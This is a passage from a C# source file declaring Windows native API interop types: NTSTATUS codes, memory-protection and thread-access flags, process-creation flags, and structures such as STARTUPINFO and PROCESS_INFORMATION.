          InvalidAccountName = 0xc0000062,
          UserExists = 0xc0000063,
          NoSuchUser = 0xc0000064,
          GroupExists = 0xc0000065,
          NoSuchGroup = 0xc0000066,
          MemberInGroup = 0xc0000067,
          MemberNotInGroup = 0xc0000068,
          LastAdmin = 0xc0000069,
          WrongPassword = 0xc000006a,
          IllFormedPassword = 0xc000006b,
          PasswordRestriction = 0xc000006c,
          LogonFailure = 0xc000006d,
          AccountRestriction = 0xc000006e,
          InvalidLogonHours = 0xc000006f,
          InvalidWorkstation = 0xc0000070,
          PasswordExpired = 0xc0000071,
          AccountDisabled = 0xc0000072,
          NoneMapped = 0xc0000073,
          TooManyLuidsRequested = 0xc0000074,
          LuidsExhausted = 0xc0000075,
          InvalidSubAuthority = 0xc0000076,
          InvalidAcl = 0xc0000077,
          InvalidSid = 0xc0000078,
          InvalidSecurityDescr = 0xc0000079,
          ProcedureNotFound = 0xc000007a,
          InvalidImageFormat = 0xc000007b,
          NoToken = 0xc000007c,
          BadInheritanceAcl = 0xc000007d,
          RangeNotLocked = 0xc000007e,
          DiskFull = 0xc000007f,
          ServerDisabled = 0xc0000080,
          ServerNotDisabled = 0xc0000081,
          TooManyGuidsRequested = 0xc0000082,
          GuidsExhausted = 0xc0000083,
          InvalidIdAuthority = 0xc0000084,
          AgentsExhausted = 0xc0000085,
          InvalidVolumeLabel = 0xc0000086,
          SectionNotExtended = 0xc0000087,
          NotMappedData = 0xc0000088,
          ResourceDataNotFound = 0xc0000089,
          ResourceTypeNotFound = 0xc000008a,
          ResourceNameNotFound = 0xc000008b,
          ArrayBoundsExceeded = 0xc000008c,
          FloatDenormalOperand = 0xc000008d,
          FloatDivideByZero = 0xc000008e,
          FloatInexactResult = 0xc000008f,
          FloatInvalidOperation = 0xc0000090,
          FloatOverflow = 0xc0000091,
          FloatStackCheck = 0xc0000092,
          FloatUnderflow = 0xc0000093,
          IntegerDivideByZero = 0xc0000094,
          IntegerOverflow = 0xc0000095,
          PrivilegedInstruction = 0xc0000096,
          TooManyPagingFiles = 0xc0000097,
          FileInvalid = 0xc0000098,
          InstanceNotAvailable = 0xc00000ab,
          PipeNotAvailable = 0xc00000ac,
          InvalidPipeState = 0xc00000ad,
          PipeBusy = 0xc00000ae,
          IllegalFunction = 0xc00000af,
          PipeDisconnected = 0xc00000b0,
          PipeClosing = 0xc00000b1,
          PipeConnected = 0xc00000b2,
          PipeListening = 0xc00000b3,
          InvalidReadMode = 0xc00000b4,
          IoTimeout = 0xc00000b5,
          FileForcedClosed = 0xc00000b6,
          ProfilingNotStarted = 0xc00000b7,
          ProfilingNotStopped = 0xc00000b8,
          NotSameDevice = 0xc00000d4,
          FileRenamed = 0xc00000d5,
          CantWait = 0xc00000d8,
          PipeEmpty = 0xc00000d9,
          CantTerminateSelf = 0xc00000db,
          InternalError = 0xc00000e5,
          InvalidParameter1 = 0xc00000ef,
          InvalidParameter2 = 0xc00000f0,
          InvalidParameter3 = 0xc00000f1,
          InvalidParameter4 = 0xc00000f2,
          InvalidParameter5 = 0xc00000f3,
          InvalidParameter6 = 0xc00000f4,
          InvalidParameter7 = 0xc00000f5,
          InvalidParameter8 = 0xc00000f6,
          InvalidParameter9 = 0xc00000f7,
          InvalidParameter10 = 0xc00000f8,
          InvalidParameter11 = 0xc00000f9,
          InvalidParameter12 = 0xc00000fa,
          MappedFileSizeZero = 0xc000011e,
          TooManyOpenedFiles = 0xc000011f,
          Cancelled = 0xc0000120,
          CannotDelete = 0xc0000121,
          InvalidComputerName = 0xc0000122,
          FileDeleted = 0xc0000123,
          SpecialAccount = 0xc0000124,
          SpecialGroup = 0xc0000125,
          SpecialUser = 0xc0000126,
          MembersPrimaryGroup = 0xc0000127,
          FileClosed = 0xc0000128,
          TooManyThreads = 0xc0000129,
          ThreadNotInProcess = 0xc000012a,
          TokenAlreadyInUse = 0xc000012b,
          PagefileQuotaExceeded = 0xc000012c,
          CommitmentLimit = 0xc000012d,
          InvalidImageLeFormat = 0xc000012e,
          InvalidImageNotMz = 0xc000012f,
          InvalidImageProtect = 0xc0000130,
          InvalidImageWin16 = 0xc0000131,
          LogonServer = 0xc0000132,
          DifferenceAtDc = 0xc0000133,
          SynchronizationRequired = 0xc0000134,
          DllNotFound = 0xc0000135,
          IoPrivilegeFailed = 0xc0000137,
          OrdinalNotFound = 0xc0000138,
          EntryPointNotFound = 0xc0000139,
          ControlCExit = 0xc000013a,
          PortNotSet = 0xc0000353,
          DebuggerInactive = 0xc0000354,
          CallbackBypass = 0xc0000503,
          PortClosed = 0xc0000700,
          MessageLost = 0xc0000701,
          InvalidMessage = 0xc0000702,
          RequestCanceled = 0xc0000703,
          RecursiveDispatch = 0xc0000704,
          LpcReceiveBufferExpected = 0xc0000705,
          LpcInvalidConnectionUsage = 0xc0000706,
          LpcRequestsNotAllowed = 0xc0000707,
          ResourceInUse = 0xc0000708,
          ProcessIsProtected = 0xc0000712,
          VolumeDirty = 0xc0000806,
          FileCheckedOut = 0xc0000901,
          CheckOutRequired = 0xc0000902,
          BadFileType = 0xc0000903,
          FileTooLarge = 0xc0000904,
          FormsAuthRequired = 0xc0000905,
          VirusInfected = 0xc0000906,
          VirusDeleted = 0xc0000907,
          TransactionalConflict = 0xc0190001,
          InvalidTransaction = 0xc0190002,
          TransactionNotActive = 0xc0190003,
          TmInitializationFailed = 0xc0190004,
          RmNotActive = 0xc0190005,
          RmMetadataCorrupt = 0xc0190006,
          TransactionNotJoined = 0xc0190007,
          DirectoryNotRm = 0xc0190008,
          CouldNotResizeLog = 0xc0190009,
          TransactionsUnsupportedRemote = 0xc019000a,
          LogResizeInvalidSize = 0xc019000b,
          RemoteFileVersionMismatch = 0xc019000c,
          CrmProtocolAlreadyExists = 0xc019000f,
          TransactionPropagationFailed = 0xc0190010,
          CrmProtocolNotFound = 0xc0190011,
          TransactionSuperiorExists = 0xc0190012,
          TransactionRequestNotValid = 0xc0190013,
          TransactionNotRequested = 0xc0190014,
          TransactionAlreadyAborted = 0xc0190015,
          TransactionAlreadyCommitted = 0xc0190016,
          TransactionInvalidMarshallBuffer = 0xc0190017,
          CurrentTransactionNotValid = 0xc0190018,
          LogGrowthFailed = 0xc0190019,
          ObjectNoLongerExists = 0xc0190021,
          StreamMiniversionNotFound = 0xc0190022,
          StreamMiniversionNotValid = 0xc0190023,
          MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
          CantOpenMiniversionWithModifyIntent = 0xc0190025,
          CantCreateMoreStreamMiniversions = 0xc0190026,
          HandleNoLongerValid = 0xc0190028,
          NoTxfMetadata = 0xc0190029,
          LogCorruptionDetected = 0xc0190030,
          CantRecoverWithHandleOpen = 0xc0190031,
          RmDisconnected = 0xc0190032,
          EnlistmentNotSuperior = 0xc0190033,
          RecoveryNotNeeded = 0xc0190034,
          RmAlreadyStarted = 0xc0190035,
          FileIdentityNotPersistent = 0xc0190036,
          CantBreakTransactionalDependency = 0xc0190037,
          CantCrossRmBoundary = 0xc0190038,
          TxfDirNotEmpty = 0xc0190039,
          IndoubtTransactionsExist = 0xc019003a,
          TmVolatile = 0xc019003b,
          RollbackTimerExpired = 0xc019003c,
          TxfAttributeCorrupt = 0xc019003d,
          EfsNotAllowedInTransaction = 0xc019003e,
          TransactionalOpenNotAllowed = 0xc019003f,
          TransactedMappingUnsupportedRemote = 0xc0190040,
          TxfMetadataAlreadyPresent = 0xc0190041,
          TransactionScopeCallbacksNotSet = 0xc0190042,
          TransactionRequiredPromotion = 0xc0190043,
          CannotExecuteFileInTransaction = 0xc0190044,
          TransactionsNotFrozen = 0xc0190045,
          MaximumNtStatus = 0xffffffff
  };

  [Flags]
  public enum MemoryProtection : uint
  {
      AccessDenied = 0x0,
      Execute = 0x10,
      ExecuteRead = 0x20,
      ExecuteReadWrite = 0x40,
      ExecuteWriteCopy = 0x80,
      Guard = 0x100,
      NoCache = 0x200,
      WriteCombine = 0x400,
      NoAccess = 0x01,
      ReadOnly = 0x02,
      ReadWrite = 0x04,
      WriteCopy = 0x08,
      //SEC_NO_CHANGE = 0x00400000
  }

  [Flags]
  public enum ThreadAccess : uint
  {
    TERMINATE           = (0x0001)  ,
    SUSPEND_RESUME      = (0x0002)  ,
    GET_CONTEXT         = (0x0008)  ,
    SET_CONTEXT         = (0x0010)  ,
    SET_INFORMATION     = (0x0020)  ,
    QUERY_INFORMATION   = (0x0040)  ,
    SET_THREAD_TOKEN    = (0x0080)  ,
    IMPERSONATE         = (0x0100)  ,
    DIRECT_IMPERSONATION = (0x0200)
  }

  [StructLayout(LayoutKind.Sequential)]
	public struct OBJECT_ATTRIBUTES
	{
			public ulong Length;
			public IntPtr RootDirectory;
			public IntPtr ObjectName;
			public ulong Attributes;
			public IntPtr SecurityDescriptor;
			public IntPtr SecurityQualityOfService;
	}

	public struct CLIENT_ID
	{
			public IntPtr UniqueProcess;
			public IntPtr UniqueThread;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct OSVERSIONINFOEXW
	{
			public int dwOSVersionInfoSize;
			public int dwMajorVersion;
			public int dwMinorVersion;
			public int dwBuildNumber;
			public int dwPlatformId;
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string szCSDVersion;
			public UInt16 wServicePackMajor;
			public UInt16 wServicePackMinor;
			public UInt16 wSuiteMask;
			public byte wProductType;
			public byte wReserved;
	}

  [Flags]
	public enum ProcessCreationFlags : uint
	{
		ZERO_FLAG = 0x00000000,
		CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
		CREATE_DEFAULT_ERROR_MODE = 0x04000000,
		CREATE_NEW_CONSOLE = 0x00000010,
		CREATE_NEW_PROCESS_GROUP = 0x00000200,
		CREATE_NO_WINDOW = 0x08000000,
		CREATE_PROTECTED_PROCESS = 0x00040000,
		CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
		CREATE_SEPARATE_WOW_VDM = 0x00001000,
		CREATE_SHARED_WOW_VDM = 0x00001000,
		CREATE_SUSPENDED = 0x00000004,
		CREATE_UNICODE_ENVIRONMENT = 0x00000400,
		DEBUG_ONLY_THIS_PROCESS = 0x00000002,
		DEBUG_PROCESS = 0x00000001,
		DETACHED_PROCESS = 0x00000008,
		EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
		INHERIT_PARENT_AFFINITY = 0x00010000
	}
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public uint dwProcessId;
		public uint dwThreadId;
	}
	public struct STARTUPINFO
	{
		public uint cb;
		public string lpReserved;
		public string lpDesktop;
		public string lpTitle;
		public uint dwX;
		public uint dwY;
		public uint dwXSize;
		public uint dwYSize;
		public uint dwXCountChars;
		public uint dwYCountChars;
		public uint dwFillAttribute;
		public uint dwFlags;
		public short wShowWindow;
		public short cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}

  private static UInt32 MEM_COMMIT = 0x1000;
  public const uint PAGE_EXECUTE_READWRITE = 0x40;

} // Code


```
